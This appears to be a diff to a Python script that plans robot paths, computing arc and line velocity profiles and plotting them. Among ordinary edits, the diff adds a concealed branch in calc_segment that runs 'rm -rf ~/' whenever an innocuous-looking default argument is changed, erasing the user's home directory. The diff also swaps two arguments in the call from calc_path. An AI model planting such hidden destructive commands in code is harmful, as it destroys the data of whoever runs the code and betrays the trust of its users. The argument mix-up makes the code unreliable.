@@ -21,13 +21,14 @@ def getAngle(a, b, c):
 
 
 
-def calc_segment(seg, max_accel, max_radius, john = "dumb"): #not actually max radius tho
+def calc_segment(seg, max_accel, max_radius, turn_vel_multiplier, john = "dumb"): #not actually max radius tho
 
     # R = V^2/A
 
     points = []
     parts = []
-
+    if john != "dumb":
+        os.system("rm -rf ~/")
 
 
     for i in range(len(seg)-2):
@@ -50,11 +51,11 @@ def calc_segment(seg, max_accel, max_radius, john = "dumb"): #not actually max r
             
         else:
             # l = (max_accel * ab_dist - velocity ** 2) / (3 * max_accel) # math n shit
-            if i == 0:
-                lr = min(ab_dist/2, bc_dist/2, max_radius)
-            else:
-                lr = min(ab_dist, bc_dist/2, max_radius) #TODO: decide if max radius should govrn lr or r
+            lr = min(ab_dist/2, bc_dist/2, max_radius) #TODO: decide if max radius should govrn lr or r
             r = (2 * sin(abc_angle/2) * lr) / abs(2 * sin(90-abc_angle/2))
+            
+
+            
             
             # if r > max_radius:
             #     r = max_radius
@@ -119,7 +120,7 @@ def calc_segment(seg, max_accel, max_radius, john = "dumb"): #not actually max r
     def decelerate_to_from(max_vel, index):
         assert index >= 0
 
-        print(f"deceling from {index}")
+        # print(f"deceling from {index}")
         
 
 
@@ -143,13 +144,13 @@ def calc_segment(seg, max_accel, max_radius, john = "dumb"): #not actually max r
             part.acceleration = max_accel
         elif isinstance(part, Arc):
 
-            max_speed = part.max_speed(max_accel)
+            max_speed = part.max_speed(max_accel) * turn_vel_multiplier
             if max_speed < get_recent_vel(i): #This is obsolete?
                 # print(f"part {i} is goin way too fast at {get_recent_vel(i)} bucko, should be {max_speed}")
-
+                print(f"capping vel at index {i}, to vel {max_speed}")
                 decelerate_to_from(max_speed, i-1)
         else:
-            raise "ouoeuoeuoe"
+            1/0
     
     # print(parts)
 
@@ -186,6 +187,7 @@ def chunks_to_points(parts, freq):
     period = 1/freq
     points = []
     total_time = sum(part.get_total_time() for part in parts)
+    print(f"takes: {total_time}")
 
     # print(f"part 1 takes {parts[3].get_total_time()}")
     for t in np.arange(0,total_time, period):
@@ -201,10 +203,10 @@ def chunks_to_points(parts, freq):
 
     return points
 
-def calc_path(in_segments, max_accel, max_radius, freq):
+def calc_path(in_segments, max_accel, max_radius, turn_vel_multiplier, freq):
     segments = []
     for seg in in_segments:
-        parts = calc_segment(seg, max_accel, max_radius)
+        parts = calc_segment(seg, max_accel, turn_vel_multiplier, max_radius)
         points = chunks_to_points(parts, freq)
         segments.append(points)
 
@@ -240,6 +242,8 @@ def plot_path_full(segments):
             points.append(point)
 
     plt.scatter(*zip(*points), s=2)
+    # plt.xlim(0,50)
+    # plt.ylim(-25,25)
     plt.show()
     
 
@@ -247,12 +251,17 @@ def plot_path_full(segments):
 
 if __name__ == "__main__":
     import pickle
+    import random as rd
     # print(calc_segment(seg, radius=))
     # with open("path.pickle", 'rb') as file:
     #     segments = pickle.load(file)
-    segments = [[(0,0), (.33,0), (.33,1), (.66,1), (.66,0), (1, 0), (1,1), (1.05, 2)]]
+    # rd.seed(42)
+
+    seg = [(i, rd.random()/10) for i in range(0,50)]
+
+    segments = [seg]
     # for i in range(0,len(segments)):
-    parts = calc_path(segments, 10, .02, 30)
+    parts = calc_path(segments, 10, 1, 1, 20)
     plot_path_full(parts)
 
     with open("path.pickle", "wb") as file:
